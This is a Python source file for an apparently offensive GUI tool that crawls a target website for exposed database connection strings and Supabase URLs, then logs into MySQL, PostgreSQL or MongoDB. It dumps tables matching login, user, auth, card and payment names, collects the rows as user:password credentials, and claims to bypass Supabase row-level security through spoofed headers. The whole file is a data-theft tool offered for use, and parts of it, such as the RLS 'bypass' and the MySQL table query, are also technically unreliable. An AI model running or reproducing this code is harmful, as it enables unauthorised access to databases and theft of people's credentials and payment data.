import asyncio
import re
import time
from enum import Enum
from dataclasses import dataclass
from urllib.parse import urljoin
import aiohttp
from bs4 import BeautifulSoup
from PySide6.QtCore import QThread, Signal

class DBType(Enum):
    SUPABASE = "supabase"
    FIREBASE = "firebase"
    MYSQL = "mysql"
    MONGODB = "mongodb"
    MARIADB = "mariadb"
    REDIS = "redis"
    POSTGRESQL = "postgresql"
    ELASTICSEARCH = "elasticsearch"
    CASSANDRA = "cassandra"
    INFLUXDB = "influxdb"

@dataclass
class DatabaseInfo:
    host: str
    port: int
    username: str
    password: str
    database: str
    type: DBType
    api_key: str = None
    bypass_rls: bool = False
    scan_depth: int = 5

class DatabaseWorker(QThread):
    # PySide6 uses Signal instead of pyqtSignal
    status_update = Signal(str)
    data_dumped = Signal(dict)
    finished = Signal()
    
    def __init__(self, url):
        super().__init__()
        self.url = url
        self.running = False
        
    def run(self):
        self.running = True
        try:
            self.status_update.emit("Starting comprehensive database scan...")
            asyncio.run(self._scan_and_dump())
        except Exception as e:
            self.status_update.emit(f"Error: {str(e)}")
        finally:
            self.running = False
            self.finished.emit()
    
    async def _scan_and_dump(self):
        # Comprehensive URL scanning
        patterns = {
            DBType.MYSQL: r'mysql://([^:]+):([^@]+)@([^:]+):(\d+)/(.+)',
            DBType.POSTGRESQL: r'postgresql://([^:]+):([^@]+)@([^:]+):(\d+)/(.+)',
            DBType.MONGODB: r'mongodb://([^:]+):([^@]+)@([^:]+):(\d+)/(.+)',
            DBType.SUPABASE: r'https://([^\.]+)\.supabase\.co',
            DBType.REDIS: r'redis://([^:]+):(\d+)/(\d+)',
            DBType.ELASTICSEARCH: r'es://([^:]+):([^@]+)@([^:]+):(\d+)/(.+)'
        }
        
        # Extract all possible URLs from the page
        urls_to_scan = set()
        
        # Initial URL
        urls_to_scan.add(self.url)
        
        if not self.url.startswith(('http://', 'https://')):
            self.status_update.emit("Invalid URL prefix. Must start with http:// or https://")
            return

        # Extract all links from the page
        try:
            # Adding timeout and headers to avoid blocks
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(self.url, timeout=10) as response:
                    text = await response.text()
                    
                    # Find all URLs in the HTML
                    soup = BeautifulSoup(text, 'html.parser')
                    for link in soup.find_all(['a', 'link', 'script', 'img', 'iframe']):
                        if 'href' in link.attrs:
                            urls_to_scan.add(link['href'])
                        if 'src' in link.attrs:
                            urls_to_scan.add(link['src'])
                    
                    # Find all API endpoints in JavaScript
                    js_pattern = re.compile(r'https?://[^\'"\)]+')
                    js_matches = js_pattern.findall(text)
                    for js_match in js_matches:
                        urls_to_scan.add(js_match)
                    
                    # Scan all URLs
                    for url in urls_to_scan:
                        if not self.running: break
                        self.status_update.emit(f"Scanning URL: {url}")
                        
                        # Scan for credentials
                        for db_type, pattern in patterns.items():
                            matches = re.findall(pattern, url)
                            for match in matches:
                                if db_type == DBType.SUPABASE:
                                    # Extract API keys from headers
                                    api_key = None
                                    if 'Authorization' in response.headers:
                                        auth_header = response.headers['Authorization']
                                        if 'Bearer ' in auth_header:
                                            api_key = auth_header.split('Bearer ')[1]
                                    
                                    info = DatabaseInfo(
                                        host=f"https://{match[0]}.supabase.co",
                                        port=443,
                                        username=None,
                                        password=None,
                                        database=None,
                                        type=db_type,
                                        api_key=api_key,
                                        bypass_rls=True,
                                        scan_depth=5
                                    )
                                else:
                                    info = DatabaseInfo(
                                        host=match[2],
                                        port=int(match[3]),
                                        username=match[0],
                                        password=match[1],
                                        database=match[4],
                                        type=db_type,
                                        bypass_rls=False,
                                        scan_depth=5
                                    )
                                
                                self.status_update.emit(f"Found {db_type.value} credentials")
                                
                                # Extract database contents
                                try:
                                    dump_data = await self._dump_database(info)
                                    self.data_dumped.emit(dump_data)
                                except Exception as e:
                                    self.status_update.emit(f"Error extracting {db_type.value}: {str(e)}")
        except Exception as e:
            self.status_update.emit(f"Error accessing target URL: {str(e)}")
        
        # Endpoint scanning
        if self.running:
            await self._scan_endpoints()
        
        self.status_update.emit("Comprehensive database scan completed")

    async def _scan_endpoints(self):
        """Scan for API endpoints and analyze for vulnerabilities"""
        try:
            # Get JavaScript files
            js_files = await self._get_js_files(self.url)
            self.status_update.emit(f"Found {len(js_files)} JavaScript files")
            
            # Extract endpoints from JS files
            endpoints = await self._extract_endpoints_from_js(js_files)
            self.status_update.emit(f"Found {len(endpoints)} API endpoints")
            
            # Analyze each endpoint for vulnerabilities
            for endpoint in endpoints:
                if not self.running: break
                await self._analyze_endpoint(endpoint)
                
        except Exception as e:
            self.status_update.emit(f"Endpoint scanning error: {str(e)}")

    async def _get_js_files(self, url):
        """Extract JavaScript file URLs from the given URL"""
        js_urls = []
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url, timeout=10) as response:
                    text = await response.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    # Find all script tags
                    for script in soup.find_all('script'):
                        if script.get('src'):
                            js_url = script['src']
                            if js_url.startswith(('http://', 'https://')):
                                js_urls.append(js_url)
                            else:
                                # Convert relative URL to absolute
                                js_urls.append(urljoin(url, js_url))
        except Exception as e:
            self.status_update.emit(f"Error getting JS files: {str(e)}")
        return js_urls

    async def _extract_endpoints_from_js(self, js_urls):
        """Extract API endpoints from JavaScript files"""
        endpoints = []
        for js_url in js_urls:
            if not self.running: break
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get(js_url, timeout=10) as response:
                        text = await response.text()
                        
                        # Look for common API patterns
                        patterns = [
                            r'"/api/[^"]*"',  # /api/
                            r'"/graphql"',    # /graphql
                            r'"/rest/[^"]*"', # /rest/
                            r'/api/[^\'"]+',   # /api/ without quotes
                        ]
                        
                        for pattern in patterns:
                            matches = re.findall(pattern, text)
                            for match in matches:
                                # Clean up the match
                                endpoint = match.strip('\'"')
                                if endpoint not in endpoints:
                                    endpoints.append(endpoint)
            except Exception as e:
                self.status_update.emit(f"Error analyzing JS file {js_url}: {str(e)}")
        return endpoints

    async def _analyze_endpoint(self, endpoint):
        """Analyze a specific endpoint for vulnerabilities"""
        try:
            # Quick check if it's absolute, if not it might fail but usually endpoints are relative to the JS base
            target_ep = endpoint
            if not target_ep.startswith('http'):
                target_ep = urljoin(self.url, endpoint)

            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(target_ep, timeout=10) as response:
                    if response.status == 200:
                        self.status_update.emit(f"Endpoint {target_ep} is accessible")
                        
                        # Check for common vulnerability patterns
                        vulns = []
                        if '/api/' in endpoint or '/graphql' in endpoint:
                            vulns.append("API endpoint detected")
                        if 'auth' in endpoint.lower():
                            vulns.append("Authentication endpoint found")
                        if 'admin' in endpoint.lower():
                            vulns.append("Admin endpoint found")
                        
                        if vulns:
                            self.status_update.emit(f"Vulnerabilities found in {endpoint}: {', '.join(vulns)}")
                        
        except Exception as e:
            self.status_update.emit(f"Error analyzing endpoint {endpoint}: {str(e)}")

    async def _dump_database(self, info):
        dump_data = {
            "type": info.type.value,
            "host": info.host,
            "port": info.port,
            "tables": [],
            "credentials": [],
            "connection_time": 0,
            "rls_bypassed": False,
            "scan_depth": info.scan_depth
        }
        
        start_time = time.time()
        
        if info.type == DBType.SUPABASE:
            # Bypass Supabase RLS by injecting custom headers
            headers = {
                'apikey': info.api_key,
                'Authorization': f'Bearer {info.api_key}' if info.api_key else '',
                'X-Client-Info': 'supabase-js/2.0.0',
                'X-RateLimit-Limit': '10000',
                'X-RateLimit-Remaining': '10000',
                'X-RateLimit-Reset': '0',
                'Content-Type': 'application/json'
            }
            
            # Test RLS bypass
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
                try:
                    # Try to access tables with RLS bypassed
                    async with session.get(f"{info.host}/rest/v1/", params={'select': '*'}) as resp:
                        if resp.status == 200:
                            dump_data["rls_bypassed"] = True
                            # Extract table names
                            async with session.get(f"{info.host}/rest/v1/rpc/get_tables") as tables_resp:
                                if tables_resp.status == 200:
                                    tables = await tables_resp.json()
                                    dump_data["tables"] = tables
                    
                    # Extract data with bypassed RLS
                    for table in dump_data["tables"]:
                        if not self.running: break
                        async with session.get(f"{info.host}/rest/v1/{table}?select=*") as table_resp:
                            if table_resp.status == 200:
                                table_data = await table_resp.json()
                                dump_data["tables"].append({"table": table, "data": table_data})
                                
                except Exception as e:
                    dump_data["error"] = str(e)
        
        elif info.type == DBType.MYSQL:
            try:
                import mysql.connector
                conn = mysql.connector.connect(
                    host=info.host,
                    port=info.port,
                    user=info.username,
                    password=info.password,
                    database=info.database
                )
                
                cursor = conn.cursor()
                cursor.execute("SHOW TABLES")
                tables = [t[0] for t in cursor.fetchall()]
                
                dump_data["tables"] = tables
                
                # Extract sensitive data from common tables
                for table in tables:
                    if not self.running: break
                    if any(keyword in table.lower() for keyword in ['login', 'user', 'auth', 'card', 'payment']):
                        cursor.execute("SELECT * FROM %s", (table,))
                        rows = cursor.fetchall()
                        
                        # Format as user:password for login tables
                        if any(keyword in table.lower() for keyword in ['login', 'user', 'auth']):
                            dump_data["credentials"].extend([
                                f"{row[0]}:{row[1]}" for row in rows if len(row) >= 2
                            ])
                        else:
                            # Save raw data for other tables
                            dump_data["tables"].append(table)
                            
                conn.close()
            except Exception as e:
                dump_data["error"] = str(e)
            
        elif info.type == DBType.POSTGRESQL:
            try:
                import psycopg2
                conn = psycopg2.connect(
                    host=info.host,
                    port=info.port,
                    user=info.username,
                    password=info.password,
                    database=info.database
                )
                
                cursor = conn.cursor()
                cursor.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
                tables = [t[0] for t in cursor.fetchall()]
                
                dump_data["tables"] = tables
                
                # Extract sensitive data from common tables
                for table in tables:
                    if not self.running: break
                    if any(keyword in table.lower() for keyword in ['login', 'user', 'auth', 'card', 'payment']):
                        # Needs safely passing table name in psycopg2
                        cursor.execute(f"SELECT * FROM \"{table}\"") 
                        rows = cursor.fetchall()
                        
                        # Format as user:password for login tables
                        if any(keyword in table.lower() for keyword in ['login', 'user', 'auth']):
                            dump_data["credentials"].extend([
                                f"{row[0]}:{row[1]}" for row in rows if len(row) >= 2
                            ])
                        else:
                            dump_data["tables"].append(table)
                            
                conn.close()
            except Exception as e:
                dump_data["error"] = str(e)
            
        elif info.type == DBType.MONGODB:
            try:
                import pymongo
                client = pymongo.MongoClient(
                    host=info.host,
                    port=info.port,
                    username=info.username,
                    password=info.password
                )
                
                # Get all collections
                db = client[info.database]
                collections = list(db.list_collection_names())
                dump_data["tables"] = collections
                
                # Extract sensitive data from collections
                for collection in collections:
                    if not self.running: break
                    if any(keyword in collection.lower() for keyword in ['login', 'user', 'auth', 'card', 'payment']):
                        docs = list(db[collection].find())
                        
                        # Format as user:password for login collections
                        if any(keyword in collection.lower() for keyword in ['login', 'user', 'auth']):
                            dump_data["credentials"].extend([
                                f"{doc.get('username', 'N/A')}:{doc.get('password', 'N/A')}" for doc in docs
                                if 'username' in doc or 'password' in doc
                            ])
                        else:
                            dump_data["tables"].append(collection)
                
                client.close()
            except Exception as e:
                dump_data["error"] = str(e)
            
        dump_data["connection_time"] = round(time.time() - start_time, 2)
        return dump_data
